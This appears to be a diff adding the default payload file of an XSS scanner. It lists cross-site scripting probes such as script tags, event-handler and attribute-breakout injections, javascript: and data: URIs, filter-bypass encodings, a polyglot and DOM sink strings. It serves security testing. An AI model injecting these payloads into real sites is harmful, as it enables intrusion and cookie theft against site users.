@@ -1,0 +1,86 @@
+# xss_scanner/payloads/default_payloads.txt
+# XSS Scanner Default Payload List
+# Basic XSS payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# Event handlers
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert(document.domain)
+
+# Data URI
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Breaking out of attributes
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+
+# Breaking out of script context
+';alert(1);//
+";alert(1);//
+\';alert(1);//
+\";alert(1);//
+</script><script>alert(1)</script>
+-alert(1)-
+'-alert(1)-'
+"-alert(1)-"
+
+# Template injection
+${alert(1)}
+#{alert(1)}
+{{alert(1)}}
+{{constructor.constructor('alert(1)')()}}
+
+# Polyglots
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Filter bypass attempts
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+<script>alert&lpar;1&rpar;</script>
+<script>alert&#40;1&#41;</script>
+<script>alert&#x28;1&#x29;</script>
+
+# HTML5 vectors
+<video><source onerror="javascript:alert(1)">
+<details open ontoggle=alert(1)>
+<embed src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+
+# CSS-based XSS
+<style>@import'javascript:alert(1)';</style>
+<style>body{background:url("javascript:alert(1)")}</style>
+
+# Meta refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# SVG vectors
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+<svg><script>alert(1)</script></svg>
+<svg><g/onload=alert(1)></svg>
+
+# DOM XSS sinks
+document.write('<img src=x onerror=alert(1)>')
+document.writeln('<img src=x onerror=alert(1)>')
+document.innerHTML='<img src=x onerror=alert(1)>'
+document.outerHTML='<img src=x onerror=alert(1)>'
